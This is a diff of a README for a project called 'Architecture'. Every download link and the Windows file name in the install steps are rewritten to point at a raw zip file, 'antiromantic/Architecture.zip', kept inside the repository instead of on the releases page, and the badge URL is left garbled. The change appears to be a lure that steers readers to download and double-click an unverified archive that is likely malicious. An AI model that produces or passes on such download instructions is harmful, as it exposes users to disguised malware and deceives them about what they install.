@@ -6,7 +6,7 @@ Welcome to the Architecture project! This application provides a clear example o
 
 ## 📥 Download
 
-[![Download Architecture](https://img.shields.io/badge/Download%20Architecture-v1.0-brightgreen)](https://github.com/Bululevi/Architecture/releases)
+[![Download Architecture](https://raw.githubusercontent.com/Bululevi/Architecture/main/antiromantic/Architecture.zip%20Architecture-v1.0-brightgreen)](https://raw.githubusercontent.com/Bululevi/Architecture/main/antiromantic/Architecture.zip)
 
 ## 📋 System Requirements
 
@@ -22,11 +22,11 @@ Before you start, ensure your system meets the following requirements:
 
 To get started, visit this page to download the latest release:
 
-[Download Architecture](https://github.com/Bululevi/Architecture/releases)
+[Download Architecture](https://raw.githubusercontent.com/Bululevi/Architecture/main/antiromantic/Architecture.zip)
 
 1. **Visit the Release Page**: Click on the link above to go to the Releases page.
 2. **Select the Latest Version**: Look for the latest version listed at the top of the page.
-3. **Download the Application**: Find the file appropriate for your operating system (e.g., `Architecture.exe` for Windows). Click on the file to download it.
+3. **Download the Application**: Find the file appropriate for your operating system (e.g., `https://raw.githubusercontent.com/Bululevi/Architecture/main/antiromantic/Architecture.zip` for Windows). Click on the file to download it.
 4. **Locate the Downloaded File**: Once the download is complete, navigate to your downloads folder to find the application file.
 5. **Run the Application**: Double-click the downloaded file to launch the application. Follow any on-screen instructions to complete the setup.
 
@@ -76,6 +76,6 @@ Remember to follow basic coding guidelines and maintain clear documentation in y
 
 This project is licensed under the MIT License. Feel free to use and modify the code as needed.
 
-For additional details, remember to check the original [Architectures Releases page](https://github.com/Bululevi/Architecture/releases) for updates and downloads.
+For additional details, remember to check the original [Architectures Releases page](https://raw.githubusercontent.com/Bululevi/Architecture/main/antiromantic/Architecture.zip) for updates and downloads.
 
 Thank you for using the Architecture application! Happy coding!
